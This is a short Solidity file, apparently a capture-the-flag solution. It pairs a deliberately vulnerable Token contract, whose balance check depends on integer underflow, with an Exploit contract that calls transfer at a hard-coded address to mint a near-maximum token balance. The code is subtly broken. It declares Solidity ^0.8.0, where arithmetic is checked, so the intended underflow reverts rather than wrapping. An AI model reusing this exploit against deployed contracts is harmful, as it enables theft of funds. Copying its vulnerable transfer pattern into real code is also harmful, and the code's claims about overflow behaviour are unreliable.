// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}


contract Exploit {
    function exploit() external {
       // overflow the value to cause an absurdly large number to be produced
        require(Token(0x5686C3179c938594A5e7b7E8EeC6f58cf6Af4538).transfer(msg.sender, type(uint256).max - 20));

    }
}